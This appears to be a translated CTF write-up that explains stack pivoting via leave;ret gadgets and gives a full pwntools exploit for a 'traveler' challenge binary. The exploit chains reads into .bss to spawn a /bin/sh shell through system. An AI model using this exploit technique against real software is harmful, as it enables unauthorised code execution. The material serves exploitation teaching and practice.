# Stack migration
As the name implies, it migrates the current stack frame to another location, i.e. rsp and rbp are changed to certain positions
Core idea: first write gadgets into some memory region, then use the first leave_ret to modify rbp to the rbp saved by the earlier overflow; ret then executes leave_ret again, which sets rsp's value to rbp; then pop rbp takes the first eight bytes of the memory region where gadgets were written as the new rbp, and ret executes the instruction at the address of the gadget-writing memory region + 8. (For multiple stack migrations, the first eight bytes of the gadget-writing memory region serve as the address of the rsp to migrate to next, and the final part is also leave_ret; remember that before leave_ret you still need to prepare in advance the gadget contents at the address rsp will migrate to. Otherwise, although leave_ret migrates there, ret may not be able to execute.)
## Detailed flow
- leave is equivalent to mov rsp,rbp pop rbp;
- ret is equivalent to pop rip;
- mov rsp,rbp assigns rbp's value to the rsp register
- pop rbp pops the top-of-stack value into the rbp register

**First, make sure the stack overflow can overwrite both ebp and ret_addr**
1. At the end of every function, leave; ret is executed. This assigns rbp's value to rsp, then gives the top-of-stack value (which at this point holds the previously saved rbp) to rbp
2. After the overflow modifies the originally saved rbp, when leave executes, rbp is changed to the rbp modified by the overflow; the return address should also have been overflow-modified earlier to the address of leave; ret
3. When the return address executes, rsp is also moved to the position of the modified rbp. Afterwards, the contents at the top of the current rsp stack are popped into rbp, so rbp is modified again, and then the instruction at the position pointed to by the current top-of-stack contents is executed

Summary
- . The first leave; ret; modifies rbp to the rbp saved by the earlier overflow
- . The second leave; ret; modifies rsp to the value of the modified rbp, and pops again to modify rbp's contents. The ret instruction then points to the instruction at the address pointed to by the current top-of-stack contents (this allows multiple stack migrations: you only need to ensure the content popped during leave is the location you need to go to, and at the end you only need leave; ret to continue executing the ROP chain at the corresponding location)

# PIE protection
PIE protection modifies the load address when the program runs, but the relative offsets between the segments inside the program do not change. You can think of it as changing the starting address at which the program is placed into memory — only the starting point changes, and then the program is loaded as is; the program itself is unchanged

So if PIE is enabled, the inside of the program does not change, but because the base address changes, the position of each segment becomes the original program's relative offset plus the starting address

# Approach
Since the program contains the system function and PIE is disabled, we can directly call the corresponding system address from IDA. If the executable has no system function, we might need libc base address + system offset. Since the challenge provides the system function, let's use it

For the /bin/sh argument: the program definitely needs stack migration anyway, otherwise the overflow range is too small to fit the gadgets for constructing arguments and the function gadgets, so we definitely fill in gadgets at the migration destination. As for the address of /bin/sh, we can input /bin/sh at a global variable; since we know the address of the global variable, we know the address of /bin/sh

 **Note**
At this point an error occurs, because the position corresponding to RSP is not writable
![Image](/images/csdn/2024/csdn-135473954/image-007-67d35d9a7d.png)
This part of the address only allows reading, not writing; the current operation requires writing, so it errors
![Image](/images/csdn/2024/csdn-135473954/image-008-1e2c86b062.png)
This can be avoided by raising the value of RSP before calling system; modifying RSP again requires another stack migration


Combining the RSP at the time system is called and the RSP when the error occurs, RSP decreased by more than 0x300. So to be safe, I plan to migrate RSP again to a +0x400 position; then I found some bugs still appeared, so just in case, it is better to adjust it as large as possible

First, modify the saved rbp to a position in bss where the ROP chain can be written before main ends, and set the return address to leave_re so that rsp can be moved to where the ROP chain has already been written.

Here, ultimately rbp is modified to the rbp saved by our overflow, and leave_ret is executed again when main ends. Before main ends, a read function is also executed to write data onto the bss segment — the corresponding ROP chain is written at this point. The first value is the new value to assign to rbp later, followed by a series of gadgets. As mentioned earlier, when executing system, rsp cannot be too low. If the gadget here were directly system's gadget, rsp would be low and the earlier situation would occur, so we need to migrate the stack once more, modify rsp's value, and then execute the corresponding ROP chain. So the gadget here should be one capable of stack migration, i.e. the rsp value to change to later + argument-modifying gadget + read function + leave_ret. Since I want to directly use the program's own gadgets to construct arguments, I can use the address where the original function begins preparing the read function call as the address for calling read. This way, for argument construction, I don't need to worry about finding gadgets, or I can directly exploit the fact that rdi, rsi, rdx are not modified after the read function, so only rsi needs modifying — and exactly such a gadget exists (the last function called before main's ret ends is one that inputs data onto the bss segment). I choose the second approach here; the input is a large bss address + pop_rsi_ret + argument + read_plt + leave_ret

But a problem appears here: the corresponding input is larger than 0x28. Hmm, so what to do?

It would be great if there were one fewer 8-byte item. Since pop_rsi_ret + argument + read_plt + leave_ret are all indispensable — only then can we successfully migrate the stack and write the ROP chain to a large bss address — it would be nice if we could input once more with only these gadgets, while still ensuring the ROP chain executes continuously

Here's a very clever method: first read, writing a gadget at the position of the instruction after read; then when read ends, the previously written gadget executes, because by the time the read function executes ret, the content has already been written to the corresponding position. Note that the read function called here must not use call read, otherwise a return address is pushed — that return address is the address of the instruction right after the call read instruction — making it impossible to form a proper ROP chain.

So the first input is a large bss address + pop_rsi_ret + argument + read_plt (the argument here is the address of the second input)
Then the second input is pop_rsi_ret + argument + read_plt + leave_ret (the argument here is the large bss address)

The final input of gadgets is /bin/sh\x00 + pop_rdi_ret + argument + system function address (the argument is the address of /bin/sh)

```c
from pwn import*
context(os="linux",arch="amd64",log_level="debug")
t=process("./traveler")
elf=ELF("./traveler")
#gdb.attach(t,"b ,main")
bss_addr=0x00000000004040A0
pop_rdi=0x00000000004012c3
system_addr=0x0000000000401090
pop_rsi_r15_ret = 0x004012c1
leave_ret=0x0000000000401253
read_addr=elf.plt["read"]
ret = 0x40101a

payload=b"a"*0x20+p64(bss_addr)+p64(leave_ret)
t.sendafter(b"who r u?\n",payload)

payload=p64(bss_addr+0x700)+p64(pop_rsi_r15_ret)+p64(bss_addr+0x28)+p64(0)+p64(read_addr) #分两次的原因原来的rdx是0x28,如果整合到一个gadget，需要多八个字节，所以分两次read
t.sendafter(b"How many travels can a person have in his life?\n",payload)

payload=p64(pop_rsi_r15_ret)+p64(bss_addr+0x700)+p64(0)+p64(read_addr)+p64(leave_ret)
t.send(payload)
payload=b"/bin/sh\x00"+p64(pop_rdi)+p64(bss_addr+0x700)+ p64(ret) +p64(system_addr)
t.send(payload)                  


t.interactive()
```
